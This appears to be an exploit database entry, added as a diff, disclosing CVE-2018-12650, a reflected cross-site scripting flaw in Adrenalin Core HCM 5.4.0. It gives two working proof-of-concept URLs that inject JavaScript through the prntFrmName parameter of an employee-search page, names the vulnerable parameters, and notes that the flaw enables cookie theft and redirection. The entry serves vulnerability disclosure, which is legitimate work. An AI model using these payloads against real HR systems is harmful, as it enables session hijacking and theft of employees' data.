@@ -1,0 +1,44 @@
+# Exploit Title: Adrenalin Core HCM 5.4.0 - 'prntDDLCntrlName' Reflected Cross-Site Scripting
+# Google Dork: NA
+# Date: 2018-09-06
+# Exploit Author: Rishu Ranjan (Cy83rl0gger)
+# Vendor Homepage: https://www.myadrenalin.com/
+# Software Link: https://www.myadrenalin.com/core-hcm/
+# Version: 5.4.0 (REQUIRED)
+# Tested on: NA
+# CVE : CVE-2018-12650
+# Type: webapps
+# Platform: Multiple
+
+# Description
+# ====================
+# A Reflected Cross Site Scripting (XSS) Vulnerability was discovered in Adrenalin Core HCM v5.4.0 HRMS Software. 
+# The user supplied input containing malicious JavaScript is echoed back as it is in JavaScript code in an HTML response.
+
+URL
+====================
+https://<Host:port>/myadrenalin/AppMaint/ApplicationtEmployeeSearch.aspx?popToken=emp&prntFrmName=AppAccFrm76096%22%3balert(1)%2f%2f150&prntDDLCntrlName=hdnEmpSearch&HRShow=0&CntrlType=txt&Applicationid=&Grade=undefined
+
+https://<Host:port>/Adrenalin/AppMaint/ApplicationtEmployeeSearch.aspx?popToken=emp&prntFrmName=AppAccFrm76096%22%3balert(1)%2f%2f150&prntDDLCntrlName=hdnEmpSearch&HRShow=0&CntrlType=txt&Applicationid=&Grade=undefined
+
+Parameter
+====================
+prntDDLCntrlName
+prntFrmName
+
+Attack Type
+====================
+Remote
+
+CVE Impact Other
+====================
+Allows an attacker to input malicious JavaScript which can steal cookie, redirect them to other malicious website, etc.
+
+Reference
+====================
+https://nvd.nist.gov/vuln/detail/CVE-2018-12650
+https://www.knowcybersec.com/2018/10/CVE-2018-12650-reflected-XSS.html
+
+Discoverer
+====================
+Rishu Ranjan
